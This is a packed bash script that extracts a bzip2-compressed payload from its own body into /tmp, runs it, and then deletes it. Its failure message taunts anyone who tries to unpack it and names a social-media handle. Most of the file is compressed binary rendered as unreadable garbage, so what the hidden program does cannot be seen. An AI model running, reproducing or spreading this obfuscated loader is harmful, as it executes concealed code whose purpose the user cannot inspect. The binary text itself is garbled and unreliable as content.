#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��w� ��g�� ����������@D@  P^u��m���@pȅOSOS�44S�2 ш =  h4�h i'�z��f��24 ��# Ѧѐ2 *a4hѡ�@4�4ѵ �@ 8i��CCC#@2 ��h� ���I	�L�#��=OT�S��L�m$��4ڃ�z�z��Q�?+H,f:]7Wn]�҃�GV��Xo}����������?�+Im�$D"0*A��g@򮹑+��i�JGpP���3�z�22�͖"<����6.*0"<�a!�92�>����h�3M9FC2g�̻hE�k�A�r�
g����w�"��݊��w=�4Rn6L�F"��X,��v@� :���&�5��S�SQ8�`����n�0��rO�C��F� PR�P��nD����9� ��YZ2sՁ �޴���G��@�F�S����A�1�84v�I\0�`��i�򿀤��L!!%�4�`b���D�d.ԝ�V@�F���U@��[��J�"4:BM� �/g�a��o2�n�x;i5�f��d���ct9�n3�`提�PG���	g�.|6!����*����p2�dC"D3kf#�LDd� G�u��V���j aP��8%w!Ef����2`�3X��+I%۸��5��CTLB�Xu��J���s�Q½С�!�x��X�(_�б-/0o�X�hx�TGߜ�jT� ���큂��
��y����י�'������pF"���x��m�å�T�+`���&;��&&<��d��V6'&}	�q���;�{:�����6��b��18�{�yB���+R`���� 莘#m���Ȓ�o F�$%�o.42�,��w��s��3��Q�9��a'AA����.���1���:��˞e��0���$�c
��ۜ	*E"2P`�p�`�����p���٘�j����M��TɈM��Y�2n0qr��VڐPϒ!P��|ţ�mWW�XV�E�s�s� X0�I&),�+�J��r�4��f��f}�>	Bt�#�Uj��rEg*��K�<1�\ł��/��HPc2�4<c5�U�X�� +$�fI��H4��mry�I	$��^�w� !8a� ��
�w$S�	~�|�